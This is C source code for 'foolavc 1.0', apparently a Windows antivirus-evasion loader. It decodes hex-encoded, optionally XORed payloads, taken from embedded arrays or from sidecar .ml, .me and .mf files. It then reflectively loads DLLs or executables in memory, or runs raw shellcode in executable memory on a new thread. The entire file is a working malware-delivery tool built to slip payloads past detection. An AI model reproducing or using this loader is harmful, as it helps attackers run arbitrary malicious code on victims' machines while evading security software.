
// foolavc 1.0

#include <SDKDDKVer.h>

#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers

#include <windows.h>
#include <stdlib.h>
#include <malloc.h>
#include <memory.h>
//#include <tchar.h>
#include <stdio.h>
#include <io.h>

#include "MemoryModule.h"

#include "payload.h"

#define F_OK 0

BOOL hd(char* pszChar)
{
	// check if character at which pszChar is pointing is hexdecimal
	return ((*pszChar >= 'a' && *pszChar <= 'f')
		|| (*pszChar >= 'A' && *pszChar <= 'F')
		|| (*pszChar >= '0' && *pszChar <= '9'));
}

char* join(char** data, size_t rows)
{
	size_t len = 0;
	size_t i;
	for (i = 0; i < rows; i++)
	{
		len += strlen(data[i]);
	}
	char *pszBuf = malloc(len + 1);
	size_t index = 0;
	for (i = 0; i < rows; i++)
	{
		size_t rowlen = strlen(data[i]);
		memcpy_s(pszBuf + index, len - index, data[i], rowlen);
		index += rowlen;
	}
	*(pszBuf + index) = '\0';
	return pszBuf;
}

char* parsePayload(char* pszF, size_t nF, BYTE xorByte, BYTE bytesPerChar, size_t* size)
{
	char* pszScan = malloc(4 + 1);
	memset(pszScan, 0, 4 + 1);
	char* pszBuf = malloc(nF + 1);
	unsigned int i = 0, j = 0;
	switch (bytesPerChar)
	{
	case 4:
		for (;;)
		{
			if (i + 4 <= nF && *(pszF + i) == '\\' && *(pszF + i + 1) == 'x'
				&& hd(pszF + i + 2) && hd(pszF + i + 3))
			{
				// parse "\x[hex]" sequences
				pszScan[0] = *(pszF + i + 2);
				pszScan[1] = *(pszF + i + 3);
				sscanf_s(pszScan, "%2x", (unsigned int*)(pszBuf + j));
				// (optional) xor payload with first character of executable name
				//pszBuf[j] ^= pszNoextArgv0[0];
				pszBuf[j] ^= xorByte;
				j += 1;
				i += 4;
			}
			else
			{
				// ignore anything else
				i += 1;
			}
			if (*(pszF + i) == '\0')
			{
				break;
			}
		}
		break;
	case 2:
		for (;;)
		{
			if (i + 2 <= nF && hd(pszF + i) && hd(pszF + i + 1))
			{
				// parse "[hex]" sequences
				pszScan[0] = *(pszF + i);
				pszScan[1] = *(pszF + i + 1);
				sscanf_s(pszScan, "%2x", (unsigned int*)(pszBuf + j));
				// (optional) xor payload with first character of executable name
				//pszBuf[j] ^= pszNoextArgv0[0];
				pszBuf[j] ^= xorByte;
				j += 1;
				i += 2;
			}
			else
			{
				// ignore anything else
				i += 1;
			}
			if (*(pszF + i) == '\0')
			{
				break;
			}
		}
		break;
	default:
		return NULL;
	}
	*(pszBuf + j) = '\0';
	//printf("\n%s (%d)", pszBuf, j);

	*size = j;
	return pszBuf;
}

char* readfile(const char* pszFilename, const char* pszExt, BYTE xorByte, BYTE bytesPerChar, const char* pszKind, size_t* size)
{
	// get argv[0]
	//unsigned int nArgv0 = MAX_PATH;
	//char* pszArgv0 = malloc(nArgv0 + 2);
	//memset(pszArgv0, 0, nArgv0 + 2);
	//GetModuleFileName(hInstance, pszArgv0, nArgv0);
	//printf("%s\n", pszArgv0);
	const char* pszArgv0 = pszFilename;

	// get basename point
	size_t nPathArgv0;
	const char* pszBaseArgv0 = strrchr(pszArgv0, '\\');
	if (pszBaseArgv0 == NULL)
	{
		nPathArgv0 = 0;
		pszBaseArgv0 = pszArgv0;
	}
	else
	{
		nPathArgv0 = pszBaseArgv0 - pszArgv0 + 1;
		pszBaseArgv0++;
	}
	//printf("%s\n", pszBaseArgv0);

	// absolute or relative path provided?
	char* pszPathArgv0;
	if (nPathArgv0 != 0)
	{
		pszPathArgv0 = malloc(nPathArgv0 + 2);
		memset(pszPathArgv0, 0, nPathArgv0 + 2);
		memcpy(pszPathArgv0, pszArgv0, nPathArgv0);
		//printf("%s (%d)\n", pszPathArgv0, nPathArgv0);
		SetCurrentDirectoryA(pszPathArgv0);
	}

	// get rid of eventual .exe extension
	char* pszExeExt = ".exe";
	size_t nNoextArgv0;
	nNoextArgv0 = strlen(pszBaseArgv0);
	if (strncmp(pszBaseArgv0 + nNoextArgv0 - 4, pszExeExt, 4) == 0)
	{
		nNoextArgv0 -= 4;
	}

	// get basename without exe
	char* pszNoextArgv0 = malloc(nNoextArgv0 + 2);
	memset(pszNoextArgv0, 0, nNoextArgv0 + 2);
	memcpy(pszNoextArgv0, pszBaseArgv0, nNoextArgv0);
	//printf("%s\n", pszNoextArgv0);

	// append new extension
	//char* pszMfExt = ".mf";
	const char* pszMfExt = pszExt;
	size_t nMfExt = strlen(pszMfExt);
	size_t nMf = nNoextArgv0 + nMfExt;
	char* pszMf = malloc(nMf + 2);
	memset(pszMf, 0, nMf + 2);
	memcpy(pszMf, pszNoextArgv0, nNoextArgv0);
	memcpy(pszMf + nNoextArgv0, pszMfExt, nMfExt);
	//printf("%s\n", pszMf);

	// read file contents
	FILE *f;
	unsigned long nF;
	char* pszF = NULL;
	if (_access(pszMf, F_OK) != -1 && fopen_s(&f, pszMf, "rb") == 0)
	{
		fseek(f, 0, SEEK_END);
		nF = ftell(f);
		fseek(f, 0, SEEK_SET);
		pszF = malloc(nF + 1);
		fread(pszF, nF, 1, f);
		fclose(f);
		pszF[nF] = '\0';
		printf("[ ] %s - successful read into memory (assuming data type: %s)\n", pszMf, pszKind);
	}
	else
	{
		printf("[!] %s - file not found!\n", pszMf);
		return NULL;
	}

	if (pszF != NULL)
	{
		// parse payload
		char* pszBuf = parsePayload(pszF, nF, xorByte, bytesPerChar, size);
		free(pszF);
		return pszBuf;		
	}
	else
	{
		return NULL;
	}
}

VOID loadDLL(HLOCAL text, SIZE_T size)
{
	HMEMORYMODULE hPEModule = MemoryLoadLibrary(text, size);
	if (hPEModule != NULL)
	{
		printf("[*] DLL loaded into memory!\n");
		MemoryFreeLibrary(hPEModule);
	}
	else
	{
		printf("[!] DLL failed to load into memory!\n");
	}
}

VOID loadAndExecuteEXE(HLOCAL text, SIZE_T size)
{
	HMEMORYMODULE hPEModule = MemoryLoadLibrary(text, size);
	if (hPEModule != NULL)
	{
		printf("[*] EXE loaded into memory!\n");
		if (MemoryCallEntryPoint(hPEModule) >= 0)
		{
			// process is replaced
		}
		else
		{
			printf("[!] Failed to execute!\n");
		}
		MemoryFreeLibrary(hPEModule);
	}
}

VOID runShellcode(HLOCAL text, SIZE_T size)
{
	PVOID p = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(p, text, size);
	HANDLE h = CreateThread(0, 0, p, 0, 0, NULL);
	WaitForSingleObject(h, -1);
}

//INT APIENTRY _tWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPTSTR lpCmdLine, _In_ INT nCmdShow)
INT main(INT argc, LPCSTR argv[], LPCSTR envp[])
{
	HLOCAL text;
	SIZE_T size;
	char* x;

	// dynamic link library payload variable present?
	if (xl[0] != NULL)
	{
		x = join(xl, sizeof(xl) / sizeof(*xl));
		text = parsePayload(x, strlen(x), 0, 2, &size);
		if (text != NULL)
		{
			// load from memory
			loadDLL(text, size);
			LocalFree(text);
		}
		free(x);
		system("pause");
		return EXIT_SUCCESS;
	}

	// executable payload variable present?
	if (xe[0] != NULL)
	{
		x = join(xe, sizeof(xe) / sizeof(*xe));
		text = parsePayload(x, strlen(x), 0, 2, &size);
		if (text != NULL)
		{
			// load and execute from memory
			loadAndExecuteEXE(text, size);
			LocalFree(text);
		}
		free(x);
		system("pause");
		return EXIT_SUCCESS;
	}

	// shellcode payload variable present?
	if (xf[0] != NULL)
	{
		x = join(xf, sizeof(xf) / sizeof(*xf));
		text = parsePayload(x, strlen(x), 0, 2, &size);
		if (text != NULL)
		{
			// execute shellcode in separate thread
			runShellcode(text, size);
			LocalFree(text);
		}
		free(x);
		system("pause");
		return EXIT_SUCCESS;
	}

	// dynamic link library payload file present?
	text = readfile(argv[0], ".ml", 0, 4, "DLL", &size);
	if (text != NULL)
	{
		// load from memory
		loadDLL(text, size);
		LocalFree(text);
		system("pause");
		return EXIT_SUCCESS;
	}
	printf("\n");

	// executable payload file present?
	text = readfile(argv[0], ".me", 0, 4, "exe", &size);
	if (text != NULL)
	{
		// load and execute from memory
		loadAndExecuteEXE(text, size);
		LocalFree(text);
		system("pause");
		return EXIT_SUCCESS;
	}
	printf("\n");

	// shellcode payload file present?
	text = readfile(argv[0], ".mf", 0, 4, "shellcode", &size);
	if (text != NULL)
	{
		// execute shellcode in separate thread
		runShellcode(text, size);
		LocalFree(text);
		system("pause");
		return EXIT_SUCCESS;
	}
	printf("\n");

	//system("pause");
	return EXIT_SUCCESS;
}
